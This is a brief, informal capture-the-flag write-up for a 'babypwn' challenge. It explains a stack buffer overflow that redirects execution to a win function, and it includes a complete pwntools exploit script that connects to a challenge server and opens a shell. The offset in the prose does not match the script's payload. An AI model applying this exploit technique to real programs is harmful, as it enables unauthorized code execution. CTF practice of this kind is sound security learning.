the challenge is to get control of the shell

on downlaoding the binary and inspecting through ghidra
we get that there is a win funciton which needs to be executed and normally not executed

we get that there is an offset of 24 on trying several values then 

go to gdb and do disassemble win which will give you address of win 

use checksec binary to figure out what kind of processor it is like 64bit or 32-bit
then use pwntools to connect and send "A"*24 + p64(WIN_ADDRESS) this will get you a shell

WIN_ADDRESS can be used in python if a binary is used will make life easier

by using ELF function

Here is the program for babypwn returns

from pwn import * 

binary = context.binary = ELF('./Downloads/chall2')


if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote('35.226.73.105', 1337)
payload=b'h4rdw0rk1337\0' + b'a'*59 + p64(binary.sym.win)
# p.recvuntil('AAAd\n')
p.recv()
p.sendline(payload)
p.interactive()

print(payload)%
